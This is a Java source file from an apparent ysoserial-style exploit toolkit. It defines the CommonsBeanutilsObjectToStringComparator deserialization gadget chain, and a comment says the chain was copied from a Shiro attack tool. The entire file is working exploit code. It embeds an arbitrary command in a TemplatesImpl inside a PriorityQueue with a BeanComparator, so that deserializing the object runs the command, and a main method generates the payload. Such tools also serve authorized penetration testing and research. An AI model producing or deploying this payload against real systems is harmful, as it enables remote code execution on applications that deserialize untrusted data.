package A.R.ysogate.payloads.gadgets;

import A.R.ysogate.payloads.utils.PayloadRunner;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.utils.Gadgets;
import A.R.ysogate.payloads.utils.Reflections;

import java.util.PriorityQueue;

/**
 * 从 https://github.com/SummerSec/ShiroAttack2/ 中抄来的链子
 *
 * @author su18
 */
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.commons:commons-lang3:3.10"})
@Authors({"水滴"})
public class CommonsBeanutilsObjectToStringComparator implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		final Object template = Gadgets.createTemplatesImpl(command);

		ObjectToStringComparator stringComparator = new ObjectToStringComparator();

		BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator());

		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

		queue.add(stringComparator);
		queue.add(stringComparator);

		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
		Reflections.setFieldValue(beanComparator, "property", "outputProperties");

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsObjectToStringComparator.class, args);
	}
}
